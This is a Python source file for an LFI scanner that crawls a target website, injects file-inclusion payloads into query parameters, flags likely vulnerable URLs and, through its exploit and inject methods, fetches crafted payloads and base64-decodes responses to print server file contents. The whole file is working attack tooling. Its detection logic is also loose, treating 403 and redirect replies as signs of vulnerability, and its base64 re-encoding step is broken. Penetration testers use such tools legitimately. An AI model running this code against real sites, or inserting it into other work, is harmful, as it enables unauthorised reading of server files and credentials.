#!/usr/bin/env python3

import base64
import getopt
import os
import re
import sys
import threading

import requests

from LFIScan.items import payloads, errors
from Crawler.Crawler import Crawler

class LFIScanner:
    def __init__(self, url):
        pass
        
    def scan(self, url):
        crawler = Crawler(url)
        links = crawler.get_crawled()
        maybeVuln = []
        for link in links:
            if self.injectable(link):  
                maybeVuln.append(link)

        vuln = []
        written = []
        for link in maybeVuln:
            if self.test(link, False): #False -> sets verbosity to false. You don't want to be spammed
                vuln.append(link)
        for link in vuln:
            link = self.strip(link)
            if link not in written:
                print(link, "might be vulnerable for LFI")
                print("Try injecting with --url [url] --inject [type] --resource [resource]")
                written.append(link)

    def injectable(self, url, v=True):
        regex = re.compile('\?[a-zA-Z0-9_]{1,}=')
        if regex.search(url):
            return True
        return False

    def strip(self, url):
        if self.injectable(url):
            regex = re.compile('\?[a-zA-Z0-9_]{1,}=')
            idx = re.findall(regex, url)
            return ''.join([url.split(idx[0])[0], idx[0]])
        else:
            print("Error, url entered is not correct.")
            return ""

    def test(self, url, v=True):
        vuln = False
        if self.injectable(url):
            for test in payloads:
                payload = self.craftPayload(self.strip(url), payloads[test])
                test = self.injectionTest(payload, v)
                if test:
                    vuln = True
                    if v:
                        print("Payload:", payload)
        else:    
            print("The url may not be injectable")
        return vuln

    def craftPayload(self, url, *argv):
        if len(argv) == 1:
            return url + argv[0]
        else:
            return url + payloads[argv[0]] + argv[1] 

    def injectionTest(self, payload, v = True):
        if re.search('zip://', payload):
            pass
        elif re.search('php://input', payload):
            pass
        elif re.search('phar://', payload):
            pass
        else:
            r = requests.get(payload)
            if r.status_code == 200:
                vuln = False
                for error in errors:
                    if error in r.text:
                        vuln = True
                if self.doubleCheck(r.text, payload):
                    vuln = True
                if vuln and v:
                    print("Website might be vulnerable.")
                    print("Try injecting with --inject [url] [ressource]\n")
                return vuln
            elif r.status_code == 403:
                if v:    
                    print("Website might be vulnerable: returned", r.status_code, "\n")
                return True
            elif r.status_code == 301 or r.status_code == 302:
                if v:
                    print("Website might be vulnerable: returned", r.status_code, "\n")
                return True
            else:
                return False

    def doubleCheck(self, text, payload):
        r = requests.get(payload + '../')
        if text == r.text:
            return False
        return True

    def exploit(self, payload):
        if re.search('zip://', payload):
            pass
        elif re.search('php://input', payload):
            pass
        elif re.search('phar://', payload):
            pass
        else:
            r = requests.get(payload)
            print(payload)
            if r.status_code == 200:
                print("Code: 200 OK")
                if re.search('base64-encode', payload):
                    for i in re.findall('[a-zA-Z0-9+/]+={,2}', r.text):
                        try:
                            print(base64.b64decode(i).decode())
                        except:
                            pass
                elif re.search('base64-decode', payload):
                    for i in re.findall('[a-zA-Z0-9+/]+', r.text):
                        try:
                            print(base64.b64encode(i).decode())
                        except:
                            pass
                        
            elif r.status_code == 404:
                print("Code: 404 Page Not Found")

    def inject(self, url, *argv):
        print(argv)
        if len(argv) == 2 and argv[0] in payloads:
            url = self.strip(url)
            payload = self.craftPayload(url, argv[0], argv[1])
            self.exploit(payload)
